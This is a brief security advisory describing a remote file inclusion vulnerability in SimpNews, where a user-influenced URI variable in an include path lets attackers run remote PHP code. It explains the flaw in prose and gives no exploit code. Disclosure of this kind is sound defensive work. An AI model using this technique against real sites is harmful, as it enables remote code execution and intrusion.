SimpNews is prone to a vulnerability that may permit remote attackers to include and execute malicious PHP scripts. Remote users, under some PHP configurations, may influence a Simpnews URI variable. This variable is used in the include path for several SimpNews configuration scripts. By influencing the include path so that it points to a malicious PHP script on a remote system, it is possible to cause arbitrary PHP code to be executed.
